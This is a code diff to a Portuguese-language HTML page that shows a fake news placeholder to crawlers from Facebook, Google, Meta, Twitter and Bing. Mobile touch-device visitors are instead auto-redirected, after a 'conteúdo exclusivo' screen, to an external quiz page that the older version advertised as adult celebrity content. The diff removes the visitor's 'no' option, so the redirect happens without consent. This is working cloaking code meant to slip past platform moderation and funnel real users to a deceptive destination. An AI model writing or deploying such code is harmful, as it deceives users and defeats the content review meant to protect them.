@@ -7,9 +7,26 @@
         body {
             font-family: 'Arial', sans-serif;
             text-align: center;
-            padding: 50px;
-            background: #f5f5f5;
+            padding: 0;
+            margin: 0;
+            background: #0a0a1a; /* Azul escuro sensual */
+            color: #fff;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        #white-page {
             max-width: 800px;
+            padding: 20px;
+        }
+        #black-page {
+            display: none;
+            background: linear-gradient(135deg, #1e0028 0%, #2a0a3a 100%); /* Roxo escuro sensual */
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            max-width: 400px;
             margin: 0 auto;
         }
         .btn {
@@ -19,47 +36,66 @@
             border-radius: 50px;
             text-decoration: none;
             display: inline-block;
-            margin: 20px 10px;
+            margin: 15px 5px;
             font-weight: bold;
+            transition: all 0.3s;
         }
-        .hidden { display: none; }
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(255,45,85,0.4);
+        }
+        h1 {
+            color: #fff;
+            margin-bottom: 20px;
+            text-shadow: 0 2px 5px rgba(0,0,0,0.3);
+        }
+        p {
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
     </style>
 </head>
 <body>
-    <!-- PÁGINA WHITE (para todos inicialmente) -->
+    <!-- PÁGINA WHITE (para bots) -->
     <div id="white-page">
         <h1>Últimas Notícias</h1>
         <p>Carregando as manchetes do dia...</p>
-        <p><small>Fonte: <a href="https://www.atelevisao.com" style="color: #666;">A Televisão</a></small></p>
+        <p><small>Fonte: <a href="https://www.atelevisao.com" style="color: #aaa;">A Televisão</a></small></p>
     </div>
 
-    <!-- PÁGINA BLACK (só aparece para humanos mobile após 3s) -->
-    <div id="black-page" class="hidden">
-        <h1>🔞 Conteúdo Adulto</h1>
-        <p>Você deseja acessar os conteúdos <strong>EXCLUSIVOS</strong> das famosas?</p>
-        <a href="https://avelino-star.github.io/Quiz/" class="btn">SIM, QUERO ENTRAR</a>
-        <a id="btn-voltar" class="btn" style="background: #666;">NÃO</a>
+    <!-- PÁGINA BLACK (para humanos) -->
+    <div id="black-page">
+        <h1>🔥 CONTEÚDO EXCLUSIVO</h1>
+        <p>Acesso liberado apenas para convidados especiais</p>
+        <p style="font-size: 14px; color: #ccc;">Você será redirecionado automaticamente</p>
     </div>
 
     <script>
-        // Verificação: humanos em mobile
-        const isBot = /bot|facebook|google|meta|twitter|slurp|bing/i.test(navigator.userAgent);
-        const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-        
-        if (!isBot && isMobile) {
-            // Mostra página BLACK após 3 segundos
+        // Verificação avançada
+        function isHuman() {
+            const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            const isBot = /bot|facebook|google|meta|twitter|slurp|bing/i.test(navigator.userAgent);
+            
+            // Testes adicionais para humanos
+            const hasTouch = 'ontouchstart' in window;
+            const isSlowConnection = navigator.connection ? navigator.connection.downlink < 5 : false;
+            
+            return isMobile && !isBot && hasTouch && !isSlowConnection;
+        }
+
+        // Fluxo principal
+        if (isHuman()) {
+            // Humanos: Mostra black page por 2s e redireciona automaticamente
             setTimeout(() => {
-                document.getElementById('white-page').classList.add('hidden');
-                document.getElementById('black-page').classList.remove('hidden');
+                document.getElementById('white-page').style.display = 'none';
+                document.getElementById('black-page').style.display = 'block';
                 
-                // Botão NÃO volta para a página white
-                document.getElementById('btn-voltar').addEventListener('click', () => {
-                    document.getElementById('black-page').classList.add('hidden');
-                    document.getElementById('white-page').classList.remove('hidden');
-                });
-            }, 3000); // Timer ajustado para 3s
+                setTimeout(() => {
+                    window.location.href = "https://avelino-star.github.io/Quiz/";
+                }, 2000);
+            }, 1000);
         } else {
-            // Bots/PCs: redireciona para atelevisao.com após 5s
+            // Bots/PCs: Fica na white page e redireciona após 5s
             setTimeout(() => {
                 window.location.href = "https://www.atelevisao.com";
             }, 5000);
